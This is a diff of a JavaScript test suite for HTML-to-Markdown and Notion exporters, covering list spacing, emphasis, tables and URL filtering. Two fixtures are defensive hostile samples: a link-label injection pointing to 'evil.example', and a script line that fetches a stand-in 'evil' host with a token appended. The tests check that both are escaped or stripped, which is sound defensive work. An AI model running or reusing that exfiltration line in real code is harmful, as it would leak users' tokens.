@@ -270,7 +270,9 @@ describe("出口面: 地址判据(相对地址补齐 / scheme 白名单)", () =>
             const blocks = [];
             DOMToNotion._cookImage(imgSrc(raw), blocks, "external");
             expect(blocks.length).toBe(0);
-            expect(HTMLToMarkdown._convertNode(imgSrc(raw))).toBe("");
+            // wave18 共识(w3 glm + qwen): 有候选地址但被判拒时 Markdown 出口不再零产出
+            // (与同文件 iframe/video/audio 及 Notion 出口 _cookBlockImage 同口径)
+            expect(HTMLToMarkdown._convertNode(imgSrc(raw))).toBe("[图片已拒（非公网 http(s) 地址）]");
         }
         // 片段链接保持纯文本(两导出器一致; DOMToNotion 另有 # 分支但判据结果相同)
         expect(DomSpec.safeUrl("#top")).toBe("");
@@ -628,11 +630,14 @@ describe("wave16: 修复后复验收敛", () => {
     });
 
     it("obsidian: ol/ul 内非 li 内容与相邻列表行分行", () => {
-        expect(HTMLToMarkdown._convertNode(element("ol", [textNode("intro"), element("li", [textNode("a")])]))).toBe("intro\n1. a\n\n");
-        expect(HTMLToMarkdown._convertNode(element("ul", [textNode("intro"), element("li", [textNode("a")])]))).toBe("intro\n- a\n");
-        // 非 li 的**元素**子节点同样不与其后列表行粘连(文本节点路径之外的分支)
-        expect(HTMLToMarkdown._convertNode(element("ol", [element("span", [textNode("intro")]), element("li", [textNode("a")])]))).toBe("intro\n1. a\n\n");
-        expect(HTMLToMarkdown._convertNode(element("ul", [element("span", [textNode("intro")]), element("li", [textNode("a")])]))).toBe("intro\n- a\n");
+        // wave18 共识(w3 dsf): 列表块前后的块级内容需**空行**分隔 —— 单个换行会被
+        // CommonMark 当作末个列表项的懒延续行(内容被并进列表项)
+        expect(HTMLToMarkdown._convertNode(element("ol", [textNode("intro"), element("li", [textNode("a")])]))).toBe("intro\n\n1. a\n\n");
+        expect(HTMLToMarkdown._convertNode(element("ul", [textNode("intro"), element("li", [textNode("a")])]))).toBe("intro\n\n- a\n");
+        // 非 li 的**元素**子节点同样不与其后列表行粘连(文本节点路径之外的分支);
+        // wave18 共识(w3 glm): ul 层的块级子元素按嵌套缩进(此前零缩进 → 渲染为顶层块)
+        expect(HTMLToMarkdown._convertNode(element("ol", [element("span", [textNode("intro")]), element("li", [textNode("a")])]))).toBe("intro\n\n1. a\n\n");
+        expect(HTMLToMarkdown._convertNode(element("ul", [element("span", [textNode("intro")]), element("li", [textNode("a")])]))).toBe("  intro\n\n- a\n");
     });
 
     it("obsidian: buildFrontmatter 对非数组 tags 不抛错(单值数组化)", () => {
@@ -720,10 +725,11 @@ describe("w3 第三模型复审: obsidian 列表/容器边界", () => {
     });
 
     it("_convertChildren: 块级子节点两侧边界不粘连", () => {
-        // 块级子节点后的文本: 此前直接拼接得 "ab"
-        expect(HTMLToMarkdown._convertNode(element("div", [element("div", [textNode("a")]), textNode("b")]))).toBe("a\nb");
+        // 块级子节点后的文本: 此前直接拼接得 "ab"; wave18 共识(w3 dsf) 起要求**空行**
+        // (单个换行是软换行/懒延续, 两个相邻块被并为同一段落)
+        expect(HTMLToMarkdown._convertNode(element("div", [element("div", [textNode("a")]), textNode("b")]))).toBe("a\n\nb");
         // 块级子节点前的文本: 同样须起行
-        expect(HTMLToMarkdown._convertNode(element("div", [textNode("a"), element("div", [textNode("b")])]))).toBe("a\nb");
+        expect(HTMLToMarkdown._convertNode(element("div", [textNode("a"), element("div", [textNode("b")])]))).toBe("a\n\nb");
         // 末尾不无条件补换行(既有单块输出逐字节兼容)
         expect(HTMLToMarkdown._convertNode(element("div", [element("div", [textNode("a")])]))).toBe("a");
         // 自带尾换行的块(p)语义不变
@@ -932,8 +938,16 @@ describe("wave17 共识: 出口面契约", () => {
     it("P .md-table 容器内多个表格逐个产出(不再只取首个)", () => {
         const table = (v) => element("table", [element("tbody", [element("tr", [element("td", [textNode(v)])], { closest: () => null })])]);
         const holder = element("div", [table("T1"), table("T2")], { classList: { contains: (c) => c === "md-table" } });
-        const blocks = [];
-        DOMToNotion._cookTable(holder, blocks, "external");
+        // wave18: 容器分派已上移至 processElement —— 经真实入口(cookedToBlocks)验证
+        const orig = globalThis.DOMParser;
+        globalThis.DOMParser = function () { return { parseFromString: () => ({ body: element("body", [holder]) }) }; };
+        let blocks;
+        try {
+            blocks = DOMToNotion.cookedToBlocks("<div>x</div>", "external");
+        } finally {
+            if (orig === undefined) delete globalThis.DOMParser;
+            else globalThis.DOMParser = orig;
+        }
         expect(blocks.filter((b) => b.type === "table").length).toBe(2);
     });
 
@@ -1097,10 +1111,12 @@ describe("wave18 w2 共识: DOMToNotion 出口面契约", () => {
         // 容器内无表格元素: 内容仍不丢
         const noTable = withDom(element("body", [mdTable([element("p", [textNode("正文")])])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
         expect(noTable.map((b) => b.type)).toContain("paragraph");
-        // 嵌套表不由 _descendantTables 重复产出(外层单元格已含其文本)
+        // 嵌套表整体只产出一个表格块(内层表的文本已并入外层单元格, 不重复落块)
         const inner = element("table", [tbody("y")]);
         const outer = element("table", [element("tbody", [element("tr", [element("td", [textNode("x"), inner])], { closest: () => null })])]);
-        expect(DOMToNotion._descendantTables(mdTable([outer]))).toEqual([outer]);
+        const nested = withDom(element("body", [mdTable([outer])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
+        expect(nested.filter((b) => b.type === "table").length).toBe(1);
+        expect(JSON.stringify(nested)).toContain("y");
     });
 
     it("透明下钻不进入跳过子树(noscript 内降级媒体不产出)", () => {
@@ -1124,6 +1140,112 @@ describe("wave18 w2 共识: DOMToNotion 出口面契约", () => {
         DOMToNotion._cookAttachment(attachment, blocks, "external");
         expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
         expect(blocks[0].paragraph.rich_text.map((r) => r.text.content).join("")).toContain("f.pdf");
+    });
+});
+
+describe("wave18 w3 共识 + w1/w2 补派: 出口面契约", () => {
+    const PUBLIC = "https://cdn.example.com/a.png";
+    const withDom = (body, fn) => {
+        const orig = globalThis.DOMParser;
+        globalThis.DOMParser = function () {
+            return { parseFromString: () => ({ body }) };
+        };
+        try { return fn(); } finally {
+            if (orig === undefined) delete globalThis.DOMParser;
+            else globalThis.DOMParser = orig;
+        }
+    };
+
+    it("列表块与后续块级内容之间有空行(不成为末项的懒延续行)", () => {
+        expect(HTMLToMarkdown._convertNode(element("ol", [element("li", [textNode("x")])]))).toBe("1. x\n\n");
+        expect(HTMLToMarkdown._convertNode(element("div", [
+            element("ol", [element("li", [textNode("x")])]),
+            element("p", [textNode("after")]),
+        ]))).toBe("1. x\n\nafter\n\n");
+        expect(HTMLToMarkdown._convertNode(element("div", [
+            element("ul", [element("li", [textNode("a")])]),
+            textNode("after"),
+        ]))).toBe("- a\n\nafter");
+    });
+
+    it("hr 前有空行(不与前文构成 setext 标题)", () => {
+        expect(HTMLToMarkdown._convertNode(element("div", [textNode("前言"), element("hr", [])])))
+            .toBe("前言\n\n---\n\n");
+    });
+
+    it("强调定界符内侧留白移到外侧(不退化为字面星号)", () => {
+        expect(HTMLToMarkdown._convertNode(element("strong", [textNode(" 重点 ")]))).toBe("**重点**");
+        expect(HTMLToMarkdown._convertNode(element("em", [textNode(" 斜 ")]))).toBe("*斜*");
+        expect(HTMLToMarkdown._convertNode(element("del", [textNode(" 删 ")]))).toBe("~~删~~");
+    });
+
+    it("引用/callout 拆行前统一行结束符(孤立 \\r 不逃逸前缀)", () => {
+        expect(HTMLToMarkdown._convertNode(element("blockquote", [textNode("a\rb")]))).toBe("> a\n> b\n\n");
+        const callout = withDom(element("body", [element("p", [textNode("a\rb")])]), () => HTMLToMarkdown.buildPostCallout({ cooked: "<p>x</p>", post_number: 1, name: "u" }, 0, true));
+        expect(callout).toContain("> a\n> b");
+    });
+
+    it("有序列表续行缩进按父项内容列(多位数序号不脱父)", () => {
+        const li = element("li", [textNode("a"), element("ul", [element("li", [textNode("b")])])]);
+        const ol = element("ol", [li], { getAttribute: attrs({ start: "10" }) });
+        expect(HTMLToMarkdown._convertNode(ol)).toBe("10. a\n    - b\n\n");
+    });
+
+    it("链接标签保留内联 Markdown(内嵌图片不被转义), 文本仍防逃逸", () => {
+        const a = element("a", [element("img", [], { getAttribute: attrs({ src: PUBLIC, alt: "A" }) })], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
+        expect(HTMLToMarkdown._convertNode(a)).toBe(`[![A](${PUBLIC})](https://cdn.example.com/p)`);
+        const inject = element("a", [textNode("a](https://evil.example)")], { getAttribute: attrs({ href: "https://cdn.example.com/p" }) });
+        expect(HTMLToMarkdown._convertNode(inject)).toBe("[a\\](https://evil.example)](https://cdn.example.com/p)");
+    });
+
+    it("textWithBreaks 剪枝 SKIP_TAGS(代码块不吸入 script 源码)", () => {
+        const pre = element("pre", [
+            element("code", [textNode("x")]),
+            element("script", [textNode("fetch('//evil/'+token)")]),
+        ]);
+        expect(DomSpec.textWithBreaks(pre)).toBe("x");
+    });
+
+    it("eachMedia 参数自身为跳过元素时不采集其后代媒体", () => {
+        const seen = [];
+        DomSpec.eachMedia(element("noscript", [element("img", [], { getAttribute: attrs({ src: PUBLIC }) })]), (n, k) => seen.push(k));
+        expect(seen).toEqual([]);
+    });
+
+    it("mediaSrc 回退到 <picture> 父级首选源(响应式图片)", () => {
+        const source = element("source", [], { getAttribute: attrs({ srcset: "https://cdn.example.com/b.webp 1x" }) });
+        const picture = element("picture", [source], { querySelector: (sel) => (sel === "source" ? source : null) });
+        const img = element("img", [], {
+            getAttribute: attrs({ src: "data:image/gif;base64,AAAA" }),
+            closest: () => picture,
+        });
+        expect(DomSpec.mediaSrc(img)).toBe("https://cdn.example.com/b.webp");
+    });
+
+    it("透明下钻段落不把切分后的片段重新合并超限(单段 ≤2000)", () => {
+        const long = "a".repeat(2500);
+        const blocks = withDom(element("body", [element("div", [textNode(long)])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
+        const rich = blocks.flatMap((b) => (b.paragraph && b.paragraph.rich_text) || []);
+        expect(rich.length).toBeGreaterThan(1);
+        expect(rich.every((r) => r.text.content.length <= 2000)).toBe(true);
+        expect(rich.map((r) => r.text.content).join("").length).toBe(2500);
+    });
+
+    it(".md-table 容器内非表格内容走同一分派(hr/列表不丢结构)", () => {
+        const mdTable = (children) => element("div", children, { classList: { contains: (c) => c === "md-table" } });
+        const hr = withDom(element("body", [mdTable([element("hr", [])])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
+        expect(hr.map((b) => b.type)).toContain("divider");
+        const list = withDom(element("body", [mdTable([element("ul", [element("li", [textNode("a")])])])]), () => DOMToNotion.cookedToBlocks("<div>x</div>", "external"));
+        expect(list.map((b) => b.type)).toContain("bulleted_list_item");
+    });
+
+    it("iframe 白名单宿主的超长 src 不写入 embed.url(降级为可见标记)", () => {
+        const longUrl = "https://www.youtube.com/watch?v=" + "a".repeat(2100);
+        const frame = element("iframe", [], { getAttribute: attrs({ src: longUrl }) });
+        const blocks = [];
+        DOMToNotion._cookIframe(frame, blocks, "external");
+        expect(blocks.map((b) => b.type)).toEqual(["paragraph"]);
+        expect(JSON.stringify(blocks)).toContain("已拒");
     });
 });
 
